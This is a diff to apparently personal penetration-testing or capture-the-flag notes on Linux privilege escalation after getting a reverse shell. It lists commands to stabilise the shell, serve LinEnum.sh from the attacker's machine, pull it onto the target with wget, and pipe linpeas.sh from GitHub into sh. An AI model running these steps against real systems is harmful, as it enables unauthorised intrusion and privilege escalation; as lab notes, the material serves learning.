@@ -11,10 +11,11 @@
 ## Getting a reverseshell(stable)
 
 ## Privilege Escalation
-0. Stabalize shell `python3 -c 'import pty; pty.spawn("/bin/bash")'`\
+0. Stabalize shell `python3 -c 'import pty; pty.spawn("/bin/bash")'` `export TERM=xterm-256color` \
 1.Automated scan for vulnerabilities or manual ennumeration.\
-2.Create a directory and a a linEnum.sh file. Copy paste the content from https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh\
+2.Create a directory and a a linEnum.sh file. Copy paste the content from https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh \
 3.Host a python server `python3 -m http.server 8080` to transfer the linEum.sh\
+3.5 
 4.From the reverse shell, `wget http://$myIP:8080/linEum.sh .` to recieve linEum.sh if we get permission denied  `cd /tmp` \
 5.Give access. `chmod +x linEum.sh` and `./linEum -t` \
 6. If file transfer premission is denied, simply `curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh` which would execute script.
